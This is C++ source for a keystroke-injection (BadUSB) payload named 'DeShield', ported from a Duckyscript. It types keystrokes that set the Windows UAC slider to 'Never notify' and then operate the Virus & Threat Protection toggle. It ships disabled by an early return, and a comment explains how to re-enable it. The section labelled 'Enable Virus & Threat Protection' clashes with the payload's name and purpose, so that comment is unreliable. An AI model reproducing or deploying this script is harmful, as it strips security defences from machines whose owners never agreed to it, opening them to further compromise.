#include "DeShield.h"
#include <Keyboard.h>
#include "../../DisabledPayload.h"

namespace {
    // Duckyscript DELAY step used between most keystrokes.
    constexpr uint32_t kStepDelayMs = 1000;
    // Duckyscript DELAY 2000 after the second search result opens.
    constexpr uint32_t kLongDelayMs = 2000;
    // The script has twenty DELAY statements: nineteen of 1000 ms and one of 2000 ms.
    constexpr uint32_t kTotalMs = 19 * kStepDelayMs + kLongDelayMs;
    // Refresh the progress bar every 125 ms, matching Drop & Upload.
    constexpr uint32_t kProgressRefreshMs = 125;

    struct TimedProgress
    {
        const BadUsbProgress &progress;
        uint32_t totalMs;
        uint32_t completedMs;

        void wait(uint32_t duration)
        {
            const uint32_t startedAt = millis();
            uint32_t elapsed = 0;
            while (elapsed < duration)
            {
                const uint32_t remaining = duration - elapsed;
                delay(remaining < kProgressRefreshMs ? remaining : kProgressRefreshMs);
                elapsed = millis() - startedAt;
                const uint32_t waited = elapsed < duration ? elapsed : duration;
                // Reserve a full bar until the keyboard sequence returns.
                progress.update(progress.context, (completedMs + waited) * 99 / totalMs);
                elapsed = millis() - startedAt;
            }
            completedMs += duration;
        }
    };

    void pressShortcut(uint8_t modifier, uint8_t key)
    {
        Keyboard.press(modifier);
        Keyboard.press(key);
        Keyboard.releaseAll();
    }
}

void sendDeShieldKeys(const BadUsbProgress &progress)
{
    // Comment out BOTH lines below to enable this payload.
    showDisabledPayload(progress);
    return;

    TimedProgress timing{progress, kTotalMs, 0};
    Keyboard.begin(KeyboardLayout_en_US);

    // --- Disable UAC prompts: set the UAC slider to "Never notify" ---
    timing.wait(kStepDelayMs);               // DELAY 1000
    pressShortcut(KEY_LEFT_CTRL, KEY_ESC);   // CONTROL ESCAPE (open Start)
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.print("uac");                   // STRING uac
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_RETURN);              // ENTER
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_DOWN_ARROW);          // DOWNARROW
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_DOWN_ARROW);          // DOWNARROW
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_DOWN_ARROW);          // DOWNARROW
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_TAB);                 // TAB
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_RETURN);              // ENTER
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_LEFT_ARROW);          // LEFT
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_RETURN);              // ENTER
    timing.wait(kStepDelayMs);               // DELAY 1000

    // --- Enable Virus & Threat Protection ---
    pressShortcut(KEY_LEFT_CTRL, KEY_ESC);   // CONTROL ESCAPE (open Start)
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.print("virus protection");      // STRING virus protection
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_RETURN);              // ENTER
    timing.wait(kLongDelayMs);               // DELAY 2000
    Keyboard.write(KEY_TAB);                 // TAB
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_TAB);                 // TAB
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_TAB);                 // TAB
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_TAB);                 // TAB
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(KEY_RETURN);              // ENTER
    timing.wait(kStepDelayMs);               // DELAY 1000
    Keyboard.write(' ');                     // SPACE
    timing.wait(kStepDelayMs);               // DELAY 1000
    pressShortcut(KEY_LEFT_ALT, KEY_F4);     // ALT F4
}
